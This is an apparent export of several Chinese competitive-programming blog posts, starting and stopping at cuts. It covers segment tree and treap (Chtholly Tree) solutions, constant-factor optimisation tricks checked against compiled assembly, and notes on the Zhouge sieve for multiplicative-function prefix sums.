update(); &#125; &#125; void modify(int x, const FFF &amp;fff) &#123; if(right - left == 1) this-&gt;fff = fff; else &#123; int mid = (this-&gt;left + this-&gt;right) &gt;&gt; 1; (x &lt; mid ? left_child : right_child)-&gt;modify(x, fff); update(); &#125; &#125; FFF query(int l, int r) &#123; if(left == this-&gt;left &amp;&amp; right == this-&gt;right) return fff; else &#123; int mid = (this-&gt;left + this-&gt;right) &gt;&gt; 1; FFF ans; if(l &lt; mid) &#123; ans = merge(ans, left_child-&gt;query(l, std::min(mid, r))); &#125; if(r &gt; mid)&#123; ans = merge(ans, right_child-&gt;query(std::max(mid, l), r)); &#125; return ans; &#125; &#125;&#125;;struct Solve &#123; SegmentTree *segt; void build () &#123; segt = new SegmentTree (0, n); segt-&gt;build(); &#125; void modify (int x, int k, int b) &#123; segt-&gt;modify(x, FFF (k, b)); &#125; int query (int left, int right, int x) &#123; FFF f = segt-&gt;query(left, right + 1); return f.value(x); &#125;&#125; solve ;inline int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead(); m = SlowRead(); for(FFF *f = origin; f != origin + n; f++)&#123; f-&gt;k = SlowRead(); f-&gt;b = SlowRead(); &#125; solve.build(); for(int i = 0; i &lt; m; i++)&#123; char opt; do opt = getchar(); while(opt != 'M' &amp;&amp; opt != 'Q'); if(opt == 'M')&#123; int x, k, b; x = SlowRead(); k = SlowRead(); b = SlowRead(); x--; solve.modify(x, k, b); &#125; else if(opt == 'Q')&#123; int left, right, x; left = SlowRead(); right = SlowRead(); x = SlowRead(); left--, right--; printf("%d\n", solve.query(left, right, x)); &#125; else throw; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>LYOI</tag>
        <tag>模拟赛</tag>
        <tag>数据结构</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线段树</tag>
        <tag>临沂一中</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OI常数优化之从入门到进阶]]></title>
    <url>%2Farticles%2FOI%E5%B8%B8%E6%95%B0%E4%BC%98%E5%8C%96-%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[这里是上一篇「玄学」常数优化的一些技巧的进阶篇什么输入输出优化 &amp;&amp; 循环展开之类的在前一篇文章中介绍过了，本文介绍一些更加实用的本文仅供参考，由读者引发的一切后果，任何责任由读者自行承担。后果包括但不限于：OJ 上一些题目爆零(CE)NOIP / NOI禁赛三年（优化后变慢优化快读我们知道，getchar是逐字符读取的，在cstdio中，有一个fread函数，能整段读取，比getchar还快，并且支持freopen(完美兼容)和fopen(需要把下面的所有stdin改成你的文件指针)函数原型：1size_t fread(void *buffer,size_t size,size_t count,FILE *stream);作用：从stream中读取count个大小为size个字节的数据，放到数组buffer中，返回成功了多少个大小为为size个字节的数据。新的代码:123456789101112131415inline char nc() &#123; static char buf[1000000], *p1 = buf, *p2 = buf; return p1 == p2 &amp;&amp; (p2 = (p1 = buf) + fread (buf, 1, 1000000, stdin), p1 == p2) ? EOF : *p1++;&#125;//#define nc getcharinline void read(int &amp;sum) &#123; char ch = nc(); int tf = 0; sum = 0; while((ch &lt; '0' || ch &gt; '9') &amp;&amp; (ch != '-')) ch = nc(); tf = ((ch == '-') &amp;&amp; (ch = nc())); while(ch &gt;= '0' &amp;&amp; ch &lt;= '9') sum = sum * 10+ (ch - 48), ch = nc(); (tf) &amp;&amp; (sum =- sum);&#125;但要注意，由于这种方法是整段读取的，这也造就了它两个巨大的Bug：不能用键盘输入。数据还没输入，程序怎么整段读取。如果你需要在电脑上用键盘输入调试，请把第5行的注释取消。不能和scanf，getchar等其他读入方法混合使用。因为fread是整段读取的，也就是说所有数据都被读取了，其他函数根本读取不到任何东西(只能从你的读取大小后面开始读)，因此，所有类型的变量读入都必须自己写，上面的read函数只支持int类型。下面是测试，摘自LibreOJ，单位为毫秒(n=3×106)(n=3\times 10^6)(n=3×10​6​​)读入方法编译器[0,21)[0,2^1)[0,2​1​​)[0,23)[0,2^3)[0,2​3​​)[0,215)[0,2^{15})[0,2​15​​)[0,231)[0,2^{31})[0,2​31​​)[0,263)[0,2^{63})[0,2​63​​)freadG++ 5.4.0 (−O2)131313131313393939707070111111111getcharG++ 5.4.0 (−O2)585858737373137137137243243243423423423cin(关闭同步)G++ 5.4.0 (−O2)161161161147147147205205205270270270394394394scanfG++ 5.4.0 (−O2)182182182175175175256256256368368368574574574cinG++ 5.4.0 (−O2)442442442429429429706706706103910391039168316831683没错，你没有看错，fread以压倒性的优势碾压了其他所有方法，而关闭同步的cin比scanf快，并且读long long的时候比getchar还要快，关于为什么不使用位运算的问题下一章会说下面的内容某些OI比赛不支持。慎用！其实还可以更快，Linux下sys/mman.h中存在函数mmap，scanf底层实现时调用的就是mmap函数，其作用是把文件映射进内存，这里仅仅给出代码，有兴趣的同学可以自行查阅有关资料代码就不改了(其实是懒12345678910111213141516171819202122#include&lt;sys/mman.h&gt;namespace Inputs&#123; char* s; int a[24]; io()&#123;s=(char*)mmap(NULL,1 &lt;&lt; 26 ,PROT_READ,MAP_PRIVATE,fileno(stdin),0);&#125; void scan(char* u)&#123; while(*s&lt;48) ++s; while(*s&gt;32) *u++=*s++; *u=0; &#125; int scan()&#123; int Hibiki=0,v=1; while(*s&lt;48) v=*s++^45?1:-1; while(*s&gt;32) Hibiki=Hibiki*10+*s++-48; return Hibiki*v; &#125;&#125;有人喜欢用isdigit宏，但这个宏在本机测试上的确更慢了，这个宏的效率还有待研究输出优化这里就略了，使用sprintf就可以了位运算在很多时候，我们会听到很多有关位运算的追捧，像”位运算的常数很小，比加减法还要快。”这是真的吗？左移和右移的天上地下下面有两段代码：123456789#include&lt;cstdio&gt;int x = 5;int main(int argc, char *const argv[]) &#123; x &lt;&lt;= 1; printf ("%d", x); return 0;&#125;123456789#include&lt;cstdio&gt;int x = 5;int main(int argc, char *const argv[]) &#123; x *= 2; printf ("%d",x); return 0;&#125;它们理论上是等价的，但g++翻译成汇编后呢？ 两段代码的汇编代码是一样的！下面是x &lt;&lt;= 1和x *= 2被翻译后的代码1addl %eax, %eax1它等价于a = a + a。是不是被打脸了，响不响，痛不痛，红不红，痒不痒……好吧，从上面的例子可以看出，某些时候自作聪明的优化并没有任何用那乘以 444 呢？翻译后的代码还是一样的1sall $2, %eax1上面的代码等价于x &lt;&lt;= 2。现在死心了吧。或许你还执着于x *= 10。这次翻译后的汇编代码终于不一样了，下面是x *= 10的汇编代码(O2优化)12leal (%eax,%eax,4), %eaxaddl %eax, %eax只有两条指令12x = x + x * 4 //别看是加法和乘法，却是一条指令完成。x = x + x //加法还不容易吗那些喜欢用x = (x &lt;&lt; 3) + (x &lt;&lt; 1)的人请自重。那是不是说位运算一无所用呢？并不是，在除法方面有不少用处。 右移的汇编代码1234movl _x, %eaxsarl %eaxmovl %eax, _xmovl _x, %eax除以2的代码1234567movl _x, %eaxmovl %eax, %edx //(del)shrl $31, %edx //(del)addl %edx, %eax //(del)sarl %eaxmovl %eax, _xmovl _x, %eax整整多了三行。但这种情况仅限于有符号的整数，因为有符号的整数的右移和除法不是同一个东西，编译器还需要修正一下。 如果用的是unsigned类型，那汇编代码又一样了Mod和And的战争下面是x % 2的代码(−O2)123456789movl _x, %eaxmovl $LC0, (%esp)movl %eax, %edx //(del)shrl $31, %edx //(del)addl %edx, %eax //(del)andl $1, %eaxsubl %edx, %eax //(del)movl %eax, 4(%esp)movl %eax, _x那x &amp; 1呢？少了444条语句(−O2)12345movl _x, %eaxmovl $LC0, (%esp)andl $1, %eaxmovl %eax, 4(%esp)movl %eax, _xXor和temp的故事相信大家在学交换两个变量的值的时候一定会先学习所谓的“三变量交换法”，然后就被异或取代了。 下面是异或(a ^= b ^= a ^= b)的汇编12345678movl _b, %edxmovl _a, %eaxxorl %edx, %eaxxorl %eax, %edxxorl %edx, %eaxmovl %eax, _axorl %eax, %eaxmovl %edx, _b有movl指令和xorl指令各444条。 那三变量交换法(int t = a;a = b,b = t;)呢？12345movl _a, %eaxmovl _b, %edxmovl %eax, _bxorl %eax, %eaxmovl %edx, _a从此，temp再没有异或。神奇的”位运算技巧”网上有很多奇奇怪怪的方法，例如取绝对值(n ^ (n &gt;&gt; 31)) - (n &gt;&gt; 31)，取两个数的最大值b &amp; ((a - b) &gt;&gt; 31) | a &amp; ( ~(a - b) &gt;&gt; 31)，取两个数的最小值a &amp; ((a - b) &gt;&gt; 31) | b &amp; ( ~(a-b) &gt;&gt; 31 )。喜欢用上面代码的人难道没有自己亲自数一数上面有多少条位运算的指令吗？但凡事没有绝对，还是有一些优秀的例子的：取最后一个111和后面的000 : lowbit(x) = (x &amp; ( -x ))判断一个数是不是222的幂n &gt; 0 ? ( n &amp; (n - 1)) == 0 : falseXor和网络流的故事还记得网络流的反向弧？通常某些人喜欢在结构体中新建一个变量来表示这条边的反向弧编号。但这样不免有些浪费，因为在插入新边的时候，我们一般会把两条互为反向弧的边相邻插入，有一个有趣的性质可以完美地解决这个问题：(2 * x) ^ 1 = 2 * x + 1, (2 * x + 1) ^ 1 = 2 * x也就是说，我们可以用异或节省下一个空间那在汇编中呢？异或本来就是逻辑运算，一条指令xorl $1, _x搞定，但如果用另一个变量呢？编译器需要对变量进行初始化，还多了一条指令条件语句相信条件语句会在程序中经常出现，而且也是不可避免的，谁知道，这么死板的事情还可以再优化。if和?:的故事在那个夜黑风高的白天。。。 if遇到了?:，然后两人吵了很久很久，然而并分不出上下，没错，?:运算符并不一定比if更快。为什么？它们的汇编长得一模一样，除了了唯一的不同：文件名(汇编第一行会带有文件名)(不论开没开O2)。12正在比较文件 if.s 和 3.sFC: 找不到差异那网上的“?:运算符比if快”是个什么鬼？ 是它们没写清楚，是“?:运算符比if-else快”。有什么区别吗？你需要先弄清楚if的工作原理。if就像一个铁路分叉道口，在CPU底层这种通讯及其不好的地方，在火车开近之前，鬼知道火车要往哪边开，那怎么办？猜！如果猜对了，它直接通过，继续前行。如果猜错了，车头将停止，倒回去，你将铁轨扳至反方向，火车重新启动，驶过道口。如果是第一种情况，那很好办，那第二种呢？时间就这么浪过去了，假如你非常不走运，那你的程序就会卡在停止-回滚-热启动的过程中。上面猜的过程就是分支预测。虽然是猜，但编译器也不是随便乱猜，那怎么猜呢？答案是分析之前的运行记录。假设之前很多次都是true，那这次就猜true，如果最近连续很多次都是false，那这次就猜false。但这一切都要看你的CPU是不是某CPU了（好像从哪里听过？），如果你遇到了一个神经CPU，那岂不是很GG？因此，一般把容易成立的条件写在前面判断，把不容易成立的条件放在else那里。但是?:消除了分支预测，因此在布尔表达式的结果近似随机的时候?:更快，否则就是if更快啦。下面的内容某些OI比赛不支持。慎用！gccgccgcc存在内置函数：__builtin_expect(!!(x), tf)当tf为true时表示x非常可能为true，反之同理用法：if(__builtin_expect(!!(x), tf))switch和if-else的故事下面有两段代码，你觉得那段更快呢？12345if (x == 1) x++;else if (x == 2) x *= 2;else if (x == 3) x /= 3;else if (x == 4) x &gt;&gt;= 1;else if (x == 5) x = 1;和123456789101112switch (x) &#123; case 1: x++; break; case 2: x *= 2; break; case 3: x /= 3; break; case 4: x &gt;&gt;= 1; break; case 5: x = 1;&#125;显然地，下面的代码更快，因为上面的代码需要逐条判断，而下面的代码直接跳转那是不是所有switch都比if快呢？凡事没有绝对，当switch遇到default的时候，整个程序的效率就会大打折扣，因为它又回到了if的无脑判断模式。再比如，当if用来判断区间的时候就比switch快，if只需要做三次逻辑运算(两条判断，一条逻辑与)，而switch呢？我就呵呵一笑短路的故事此短路非彼短路，它指的是一种运算符的特性。 我们常用的逻辑运算符，例如&amp;&amp;和||都是短路运算符。什么意思呢？比如在运算A&amp;&amp;B时，如果发现A已经为false，就不会再计算B。现在你能解释第一章中留下的问题了吗？(tf)&amp;&amp;(sum=-sum);当tf为true的时候，会执行后面的sum=-sum，如果tf为false，则不会执行后面的sum=-sum。 等价于如下语句：1if (tf) sum =- sum;tf=((ch==&#39;-&#39;)&amp;&amp;(ch=getchar()));当ch=&#39;-&#39;时，会执行后面的ch=getchar()，因为getchar一般不会等于 00（如果不放心可以写成tf=((ch==&#39;-&#39;)&amp;&amp;((ch=getchar()),true))），因此tf的结果等于true。当ch!=&#39;-&#39;时，不会执行后面的ch=getchar()，tf的值为false。等价于如下语句：1234if ( ch == '-' ) &#123; tf = true; ch = getchar();&#125;总结一下：if(A) B; →\rightarrow→ (A)&amp;&amp;(B)if(A) B; else C; →\rightarrow→ A&amp;&amp;(B,1)||C为什么？详情参见下一小节。如果短路运算符只能改写if语句，那这里就不会浪费这么多篇幅来介绍这个东西。事实上，这个东西比我们想象得有用得多。看下面两段代码：123double t = rand();if (t / RAND_MAX &lt; 0.2 &amp;&amp; t != 0) printf ("%d", t);123double t = rand();if (t != 0 &amp;&amp; t / RAND_MAX &lt; 0.2) printf ("%d", t);你认为那一份代码会更快？好像没什么区别对吧。但对于CPU来说很有区别。第一段代码中的t/RAND_MAX&lt;0.2为true的概率约为 20%20\%20%，但t!=0为true的概率约为1RAND_MAX1\over RAND\_MAX​RAND_MAX​​1​​，明显小于20%20\%20%因此，如果把计算一个不含逻辑运算符布尔表达式的计算次数设为 111 次，设计算了 XXX 次，则对于第 111 段代码，XXX 的数学期望为 656\over 5​5​​6​​ 次，但对于第二段代码，XXX 的数学期望为 ，远远大于第一段代码。总结一下， - 遇到A&amp;&amp;B时，优先把可能为false的表达式放在前面。 - 遇到A||B时，优先把可能为true的表达式放在前面。布尔表达式和逗号运算符的故事为什么要专门设置这么一小节呢？ 因为很多人喜欢用if(x==true)，直接用if(x)就好了。还有x==false和!x，它们也是等价的。现在，请另一位大佬隆重登场：逗号运算符。若干条语句可以通过逗号运算符合并成一条语句。 例如t=a;a=b;b=t;可以写成t=a,a=b,b=t;有什么用吗？它的返回值。1int x=(1,5,4,2,6,3,9);猜一猜，上面的语句执行完后x的值是多少？ 答案是 999没错，逗号运算符的返回值就是最后一个的值。现在可以解释上一小结留下总结了吧。A&amp;&amp;(B,1)||C当A为true时会执行(B,1)，返回值为true，因此A&amp;&amp;(B,1)的返回值为true，因此不会执行C，当A为false时，不会执行(B,1)，且A&amp;&amp;(B,1)的值为false，因此会执行C这次就先写到这里吧quq打算出再一个从进阶到入土quq（咕咕]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>优化</tag>
        <tag>乱搞</tag>
        <tag>玄学</tag>
        <tag>常数优化</tag>
        <tag>卡常</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[洲阁筛算法学习笔记]]></title>
    <url>%2Farticles%2F%E6%B4%B2%E9%98%81%E7%AD%9B%2F</url>
    <content type="text"><![CDATA[洲阁筛算法一种在 O(n34logn)O(\frac{n^\frac 3 4}{\log n})O(​logn​​n​​4​​3​​​​​​) 的时间中求出大多数积性函数的前缀和的方法.引入求∑i=1nF(i)\sum_{i = 1}^{n} F(i)​i=1​∑​n​​F(i)其中 F(x)F(x)F(x) 是一个积性函数. 要求在低于线性的时间内求出.转化如果 F(x)F(x)F(x) 是一个十分特殊的积性函数, 比如 μ2(x)\mu^2(x)μ​2​​(x), 那么可以非常快地求出; 就算它不那么特殊, 如果我们能找到两个合适的函数 G,HG, HG,H 满足 F∗G=HF * G = HF∗G=H, 并且 G,HG, HG,H 的前缀和容易求出, 那么可以利用杜教筛在 O(n23)O(n^{\frac{2}{3}})O(n​​3​​2​​​​) 的时间内求出. 但是当 F(x)F(x)F(x) 不具备这些性质的时候呢?当然了, 还是有一个要求: 当 ppp 为质数的时候, F(pc)F(p^c)F(p​c​​) 是一个关于 ppp 的低阶多项式.我们将 [1,n][1, n][1,n] 的所有数按照是否有 &gt;n&gt; \sqrt{n}&gt;√​n​​​ 的质因子分为两类, 那么显然有:由于 i≥ni \ge \sqrt{n}i≥√​n​​​ 时后面一部分等于 111, 所以需要计算以下两个东西:对于每个 1≤i&lt;n1 \le i &lt; \sqrt{n}1≤i&lt;√​n​​​, 计算当然, 最后还要用线性筛求出 [1,n)[1, \sqrt{n})[1,√​n​​​) 的 F(x)F(x)F(x) 乘上相应的系数对答案的贡献, 这一部显然不会成为瓶颈.Part 1设 gk(i,j)g_k(i, j)g​k​​(i,j) 表示 [1,j][1, j][1,j] 中与前 iii 个质数互质的数的 kkk 次幂和. 显然有转移gk(i,j)=gk(i−1,j)−pikgk(i−1,⌊jpi⌋)g_k(i, j) = g_k(i - 1, j) - p_i^k g_k(i - 1, \lfloor \frac{j}{p_i} \rfloor)g​k​​(i,j)=g​k​​(i−1,j)−p​i​k​​g​k​​(i−1,⌊​p​i​​​​j​​⌋)观察到 jjj 的取值只有 n\sqrt{n}√​n​​​ 种, 于是直接暴力计算的复杂度为 O(nlogn)O(\frac{n}{\log n})O(​logn​​n​​).考虑优化. 首先注意到当 pi+1&gt;jp_{i + 1} &gt; jp​i+1​​&gt;j 时 gk(i,j)=1g_k(i, j) = 1g​k​​(i,j)=1, 但是这个观察并不能带来什么优化; 紧接着我们发现如果 pi&gt;⌊jpi⌋p_i &gt; \lfloor \frac{j}{p_i} \rfloorp​i​​&gt;⌊​p​i​​​​j​​⌋ 即 pi2&gt;jp_i^2 &gt; jp​i​2​​&gt;j 时, gk(i,j)g_k(i, j)g​k​​(i,j) 的转移变为:gk(i,j)=gk(i−1,j)−pikg_k(i, j) = g_k(i - 1, j) - p_i^kg​k​​(i,j)=g​k​​(i−1,j)−p​i​k​​我们从小到大枚举 iii, 对于某个 jjj 一旦 pi02&gt;jp_{i_0}^2 &gt; jp​i​0​​​2​​&gt;j 便可以不再转移, 之后如果其他的值需要使用到它在 i1i_1i​1​​ 时的值, 直接用 gk(i0,j)−∑l=i0i1−1plkg_k(i_0, j) - \sum_{l = i_0}^{i_1 - 1} p_l^kg​k​​(i​0​​,j)−∑​l=i​0​​​i​1​​−1​​p​l​k​​ 即可. (其实这个地方还有一些细节, 可以自己思考)此时的复杂度可以简单地用积分近似为 O(n34logn)O(\frac{n\frac{3}{4}}{\log n})O(​logn​​n​4​​3​​​​).Part 2设 f(i,j)f(i, j)f(i,j) 表示 [1,j][1, j][1,j] 中仅由前 iii 个质数组成的数的 F(x)F(x)F(x) 之和. 显然有转移f(i,j)=f(i−1,j)+∑c≥1F(pic)f(i−1,⌊jpic⌋)f(i, j) = f(i - 1, j) + \sum_{c \ge 1} F(p_i^c) f(i - 1, \lfloor \frac{j}{p_i^c} \rfloor)f(i,j)=f(i−1,j)+​c≥1​∑​​F(p​i​c​​)f(i−1,⌊​p​i​c​​​​j​​⌋)虽然多出来一个 ∑c≥1\sum_{c \ge 1}∑​c≥1​​, 但是直接暴力计算的复杂度仍然是 O(nlogn)O(\frac{n}{\log n})O(​logn​​n​​) . 如何优化? 似乎不太能沿用之前的方法了.但是如果将状态定义中的&quot;前 iii 个质数&quot;改为&quot;(小于 n\sqrt{n}√​n​​​)的后 iii 个质数&quot;, 此时当 pi&gt;jp_i &gt; jp​i​​&gt;j 时, 一定有f(i,j)=1f(i, j) = 1f(i,j)=1. 类似地, 当 pi2&gt;jp_i^2 &gt; jp​i​2​​&gt;j 时转移变为:f(i,j)=f(i−1,j)+F(pi)f(i,j) = f(i - 1, j) + F(p_i)f(i,j)=f(i−1,j)+F(p​i​​)所以可以从大到小枚举 iii, 如果对于某个 jjj 有 pi2&gt;jp_i^2 &gt; jp​i​2​​&gt;j, 可以不转移, 每次用的时候加入 [pi,min(j,n)][p_i, \min(j, \sqrt{n})][p​i​​,min(j,√​n​​​)] 这一段的质数的 F(p)F(p)F(p) 就可以了.类似上面的分析, 复杂度为 O(n34logn)O(\frac{n^{\frac{3}{4}}}{\log n})O(​logn​​n​​4​​3​​​​​​).小结从上面的推导可以看出, 如果 F(pc)F(p^c)F(p​c​​) 是一个关于 ppp 的常数阶多项式, 那么我们可以在 O(n34logn)O(\frac{n^{\frac{3}{4}}}{\log n})O(​logn​​n​​4​​3​​​​​​) 的时间内求出 F(x)F(x)F(x) 的前 nnn 项和. 利用滚动数组, 空间复杂度是 O(n)O(\sqrt{n})O(√​n​​​) 的.主要用到了以下几个想法:将所有数分按照有无大于 n\sqrt{n}√​n​​​ 的质因子为两类整除的结果只有 O(n)O(\sqrt{n})O(√​n​​​) 种一个关于递推的优化技巧这几个想法相对独立, 都挺有启发性的, 感觉甚至可以优化一些 DPDPDP.例题: SPOJ DIVCNT3Description求∑i=1nd(i3)\sum_{i = 1}^{n} d(i^3)​i=1​∑​n​​d(i​3​​)其中 d(x)d(x)d(x) 表示 xxx 的约数个数.n≤1011n \le 10^{11}n≤10​11​​, 时限 20s20s20s.Solution直接上洲阁筛, 其中 F(pc)=3c+1F(p^c) = 3c + 1F(p​c​​)=3c+1.提供主要代码以供参考. 其中 sump[i] 表示小于等于 iii 的质数之和, d3[i] 表示 d(i3)d(i^3)d(i​3​​).1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465LL N;int pbnd;int vbnd;int l0[SIZE], l[SIZE];LL g0[SIZE], g[SIZE], f0[SIZE], f[SIZE];void calcG() &#123; for (int i = 1; i &lt; vbnd; ++i) g0[i] = i; for (int i = vbnd - 1; i &gt;= 1; --i) g[i] = N / i; for (int i = 0; i &lt; pbnd; ++i) &#123; int p = primes[i]; for (int j = 1; j &lt; vbnd &amp;&amp; i &lt; l[j]; ++j) &#123; LL y = (N / j) / p; g[j] -= (y &lt; vbnd ? g0[y] - std::max(0, i - l0[y]) : g[N / y] - std::max(0, i - l[N / y])); &#125; for (int j = vbnd - 1; j &gt;= 1 &amp;&amp; i &lt; l0[j]; --j) &#123; LL y = j / p; g0[j] -= g0[y] - std::max(0, i - l0[y]); &#125; &#125; for (int i = 1; i &lt; vbnd; ++i) g[i] -= pbnd - l[i];&#125;void calcF() &#123; std::fill(f0 + 1, f0 + vbnd, 1); std::fill(f + 1, f + vbnd, 1); for (int i = pbnd - 1; i &gt;= 0; --i) &#123; int p = primes[i]; for (int j = 1; j &lt; vbnd &amp;&amp; i &lt; l[j]; ++j) &#123; LL y = (N / j) / p; for (int z = 1; y; ++z, y /= p) &#123; f[j] += (3 * z + 1) * (y &lt; vbnd ? f0[y] + 4 * std::max(0, sump[y] - std::max(l0[y], i + 1)) : f[N / y] + 4 * (pbnd - std::max(l[N / y], i + 1))); &#125; &#125; for (int j = vbnd - 1; j &gt;= 1 &amp;&amp; i &lt; l0[j]; --j) &#123; int y = j / p; for (int z = 1; y; ++z, y /= p) &#123; f0[j] += (3 * z + 1) * (f0[y] + 4 * std::max(0, sump[y] - std::max(l0[y], i + 1))); &#125; &#125; &#125; for (int i = 1; i &lt; vbnd; ++i) f[i] += 4 * (pbnd - l[i]);&#125;LL calcSumS3() &#123; for (vbnd = 1; (LL)vbnd * vbnd &lt;= N; ++vbnd) &#123; &#125; for (pbnd = 0; (LL)primes[pbnd] * primes[pbnd] &lt;= N; ++pbnd) &#123; &#125; for (int i = 1; i &lt; vbnd; ++i) &#123; for (l0[i] = l0[i - 1]; (LL)primes[l0[i]] * primes[l0[i]] &lt;= i; ++l0[i]) &#123; &#125; &#125; l[vbnd] = 0; for (int i = vbnd - 1; i &gt;= 1; --i) &#123; LL x = N / i; for (l[i] = l[i + 1]; (LL)primes[l[i]] * primes[l[i]] &lt;= x; ++l[i]) &#123; &#125; &#125; calcG(); calcF(); LL ret = f[1]; for (int i = 1; i &lt; vbnd; ++i) ret += d3[i] * 4 * (g[i] - 1); return ret;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「数据结构」珂朵莉树 Chtholly Tree]]></title>
    <url>%2Farticles%2FChtholly-Tree-ODT%2F</url>
    <content type="text"><![CDATA[又是一个玄学数据结构ChthollyChthollyChtholly TreeTreeTree 珂朵莉树，又称OldOldOld DriverDriverDriver TreeTreeTree，能够水过无数数据结构题本来以为是一种十分玄学的数据结构，发现这其实是一个很智障的东西珂朵莉树操作前提一般用珂朵莉树的题有两个操作要求： 1.有区间覆盖操作，即是把[l,r][l,r][l,r]区间全部覆盖为xxx. 2.数据随机看到2大概各位dalao应该已经懂了这个算法是有多么的不稳定了 ( 不过随机情况下的效率确实挺高。珂朵莉树工作原理珂朵莉树其实就是把相同的区间整合到111个节点提高访问速度（比如区间覆盖）。所以随便写一颗平衡树即可。下面来看道例题：下方毒瘤代码预警Codeforces#449 Div.1 C维护一种数据结构，支持: 区间加，区间覆盖，区间求第k大，区间求x次方和(x≤1e9)(x≤1e9)。 保证数据随机。貌似就是要告诉你一定要用珂朵莉树 如果谁写出了一种维护xxx次方和的高效数据结构请教教我quq 证明时间复杂度请看: Codeforces 代码里面也有123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272// Codeforces#449 Div.1 C// By: Shq//#include &lt;bits/stdc++.h&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;stack&gt;typedef long long ll;typedef unsigned int ut;inline void SlowPrint(ll x) &#123; static int buf[50]; if (!x) &#123; putchar ('0'); return; &#125; if (x &lt; 0) &#123; putchar ('-'); x =- x; &#125; while (x) &#123; buf[ ++buf[0] ] = x % 10; x /= 10; &#125; while (buf[0]) putchar (buf[ buf[0]-- ] + '0');&#125;inline ut unit() &#123; static ut state0 = 19491001; state0 ^= (state0 &lt;&lt; 13); state0 ^= (state0 &gt;&gt; 17); state0 ^= (state0 &lt;&lt; 5); return state0;&#125;inline int SlowRead () &#123; char ch = getchar(); int data = 0, f = 1; while (!isdigit (ch)) &#123; if (ch == '-') f = -1; ch = getchar();&#125; while (isdigit (ch)) &#123; data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0'; ch = getchar (); &#125; return data * f;&#125;const int MAXN = 5e5 + 50;const ll INF = 0x3f3f3f3f;int n,Q;struct Node &#123; Node *left, *right; bool rev_tag; ll add_tag; ll val,sum,mx,mn; int size,cnt; ut pri; inline void pd(); inline void add(int v); inline void rev(); inline void upt();&#125;Pool[MAXN], *pool = Pool, *null = Pool, *rt = null;typedef std::pair&lt;Node*,Node*&gt; pii;inline Node *Insert (int val,int o) &#123; ++pool; pool-&gt;left = pool-&gt;right = null; pool-&gt;rev_tag = (pool-&gt;add_tag = 0); pool-&gt;val = val; pool-&gt;sum = 1ll * val * o; pool-&gt;mx = val; pool-&gt;mn = val; pool-&gt;size = (pool-&gt;cnt=o); pool-&gt;pri = unit(); return pool;&#125;inline void Node::add (int v) &#123; val += v; sum += 1ll * v * size; add_tag += v; mx += v; mn += v;&#125;inline void Node::rev () &#123; std::swap (left, right); rev_tag = (!rev_tag);&#125;inline void Node::upt () &#123; sum = left-&gt;sum + right-&gt;sum + 1ll * val * cnt; size = left-&gt;size + right-&gt;size + cnt; mx = std::max(val, std::max(left-&gt;mx,right-&gt;mx)); mn = std::min(val, std::min(left-&gt;mn,right-&gt;mn));&#125;inline void Node::pd () &#123; if(add_tag) &#123; if (left != null) left-&gt;add(add_tag); if (right != null) right-&gt;add(add_tag); add_tag = 0; &#125; if(rev_tag) &#123; if(left != null) left-&gt;rev(); if(right != null) right-&gt;rev(); rev_tag = 0; &#125;&#125;inline pii split (Node *x, int size) &#123; if (x == null) return std::make_pair (null, null); x-&gt;pd (); if (x-&gt;left-&gt;size + x-&gt;cnt &lt;= size) &#123; pii tr1 = split(x-&gt;right, size-x-&gt;left-&gt;size - x-&gt;cnt); x-&gt;right = tr1.first; x-&gt;upt(); return std::make_pair (x, tr1.second); &#125; else &#123; pii tr1 = split (x-&gt;left, size); x-&gt;left = tr1.second; x-&gt;upt(); return std::make_pair (tr1.first, x); &#125;&#125;inline Node *merge(Node *x, Node *y) &#123; if (x == null) return y; if (y == null) return x; x-&gt;pd(); y-&gt;pd(); if (x-&gt;pri &gt; y-&gt;pri) &#123; x-&gt;right = merge(x-&gt;right, y); x-&gt;upt(); return x; &#125; else &#123; y-&gt;left = merge(x, y-&gt;left); y-&gt;upt(); return y; &#125;&#125;inline int findlef (Node *x, int rright) &#123; if (x-&gt;left != null) &#123; int t = findlef(x-&gt;left, rright); x-&gt;upt(); return t; &#125; else &#123; x-&gt;cnt -= rright; x-&gt;upt(); return x-&gt;val; &#125;&#125;inline pii Get(Node *x,int size) &#123; pii tr1 = split(x,size); int sz = size - tr1.first-&gt;size; if (sz) &#123; int t = findlef (tr1.second, sz); tr1.first = merge (tr1.first, Insert(t, sz)); &#125; return tr1;&#125;std::vector&lt; std::pair&lt;ll,int&gt; &gt;vv;inline void getnode(Node *x) &#123; vv.push_back (std::make_pair (x-&gt;val,x-&gt;cnt)); x-&gt;pd(); if (x-&gt;left != null) getnode(x-&gt;left ); if (x-&gt;right != null) getnode(x-&gt;right);&#125;inline void travel (Node *x) &#123; vv.clear(); getnode(x);&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead (); null-&gt;mx = -INF; null-&gt;mn = INF; int wp = n; while (wp --&gt; 0) &#123;rt = merge (rt, Insert(SlowRead (), 1));&#125; Q=SlowRead (); 